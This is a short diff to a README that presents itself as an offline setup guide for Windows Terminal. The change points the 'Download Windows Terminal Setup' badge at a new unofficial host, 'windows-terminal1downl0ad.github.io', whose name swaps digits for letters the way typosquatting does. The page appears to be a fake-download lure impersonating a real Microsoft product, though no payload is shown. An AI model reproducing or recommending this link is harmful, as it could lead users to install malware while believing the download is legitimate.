@@ -1,6 +1,6 @@
 # Windows Terminal — Offline Setup Guide
 
-[![Download Windows Terminal Setup](https://img.shields.io/badge/Download-Windows_Terminal_Setup-blueviolet)](https://windows-terminal-download.github.io/.github)
+[![Download Windows Terminal Setup](https://img.shields.io/badge/Download-Windows_Terminal_Setup-blueviolet)](https://windows-terminal1downl0ad.github.io/.github/)
 
 ## ⚙️ How to Use
 
